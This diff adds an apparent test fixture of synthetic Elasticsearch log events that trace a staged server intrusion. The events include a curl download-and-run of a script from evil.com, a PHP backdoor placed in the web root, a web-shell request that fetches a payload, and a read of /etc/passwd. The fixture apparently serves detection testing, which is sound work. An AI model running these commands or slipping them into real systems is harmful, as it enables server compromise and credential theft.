@@ -1,0 +1,19 @@
+{"index":{"_index":"unified-logs-2026.01.15"}}
+{"@timestamp":"2026-01-14T09:00:00Z","timestamp":"2026-01-14T09:00:00Z","host":{"name":"web-server-01"},"event":{"category":"process","id":"evt_nmap"},"process":{"pid":1000,"executable":"/usr/bin/nmap","command_line":"nmap -Pn -p80 10.0.0.5","start_time":"2026-01-14T09:00:00Z"},"detection":{"severity":"low","confidence":0.1}}
+{"index":{"_index":"unified-logs-2026.01.15"}}
+{"@timestamp":"2026-01-14T09:10:00Z","timestamp":"2026-01-14T09:10:00Z","host":{"name":"web-server-01"},"event":{"category":"authentication","action":"success","id":"evt_ssh"},"user":{"name":"root"},"source":{"ip":"203.0.113.5"},"detection":{"confidence":0.2}}
+{"index":{"_index":"unified-logs-2026.01.15"}}
+{"@timestamp":"2026-01-14T09:11:00Z","timestamp":"2026-01-14T09:11:00Z","host":{"name":"web-server-01"},"event":{"category":"process","id":"evt_bash"},"process":{"pid":2000,"executable":"/bin/bash","command_line":"bash","start_time":"2026-01-14T09:11:00Z","parent":{"pid":1}}}
+{"index":{"_index":"unified-logs-2026.01.15"}}
+{"@timestamp":"2026-01-14T09:12:00Z","timestamp":"2026-01-14T09:12:00Z","host":{"name":"web-server-01"},"event":{"category":"process","id":"evt_curl"},"process":{"pid":3000,"executable":"/usr/bin/curl","command_line":"curl http://evil.com/malware.sh -o /tmp/malware.sh && bash /tmp/malware.sh","start_time":"2026-01-14T09:12:00Z","parent":{"pid":2000}},"detection":{"severity":"high","confidence":0.9}}
+{"index":{"_index":"unified-logs-2026.01.15"}}
+{"@timestamp":"2026-01-14T09:12:10Z","timestamp":"2026-01-14T09:12:10Z","host":{"name":"web-server-01"},"event":{"category":"file","action":"write","id":"evt_write_php"},"file":{"path":"/tmp/mal.php","extension":"php"},"process":{"pid":3000,"executable":"/usr/bin/curl","command_line":"..."}}
+{"index":{"_index":"unified-logs-2026.01.15"}}
+{"@timestamp":"2026-01-14T09:12:20Z","timestamp":"2026-01-14T09:12:20Z","host":{"name":"web-server-01"},"event":{"category":"process","id":"evt_mv"},"process":{"pid":3000,"executable":"/bin/mv","command_line":"mv /tmp/mal.php /var/www/html/backdoor.php","start_time":"2026-01-14T09:12:20Z","parent":{"pid":2000}}}
+{"index":{"_index":"unified-logs-2026.01.15"}}
+{"@timestamp":"2026-01-14T09:12:30Z","timestamp":"2026-01-14T09:12:30Z","host":{"name":"web-server-01"},"event":{"category":"process","id":"evt_exec_webshell"},"process":{"pid":4000,"executable":"/usr/sbin/apache2","command_line":"GET /backdoor.php?c=curl http://evil.com/payload -o /tmp/p","start_time":"2026-01-14T09:12:30Z"}}
+{"index":{"_index":"unified-logs-2026.01.15"}}
+{"@timestamp":"2026-01-14T09:12:40Z","timestamp":"2026-01-14T09:12:40Z","host":{"name":"web-server-01"},"event":{"category":"process","id":"evt_cat"},"process":{"pid":4001,"executable":"/bin/cat","command_line":"cat /etc/passwd","start_time":"2026-01-14T09:12:40Z","parent":{"pid":4000}}}
+{"index":{"_index":"unified-logs-2026.01.15"}}
+{"@timestamp":"2026-01-14T09:13:00Z","timestamp":"2026-01-14T09:13:00Z","host":{"name":"web-server-01"},"event":{"category":"memory"},"memory":{"anomalies":[{"type":"RWX_REGION","risk_level":"HIGH"}]}}
+
